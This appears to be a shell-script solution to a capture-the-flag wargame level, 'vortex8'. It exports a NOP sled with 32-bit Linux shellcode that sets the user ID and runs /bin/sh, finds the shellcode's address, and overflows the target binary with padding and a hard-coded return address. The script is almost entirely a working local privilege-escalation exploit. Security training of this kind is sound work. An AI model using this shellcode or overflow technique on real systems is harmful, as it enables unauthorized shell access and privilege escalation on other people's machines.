# !/bin/sh

mkdir /tmp/ballban_vortex8
cd /tmp/ballban_vortex8


# Set env
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG
./check_env EGG

/vortex/vortex8 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 1032 + b'B' * 4 + struct.pack('<I', 0xffffdb99))")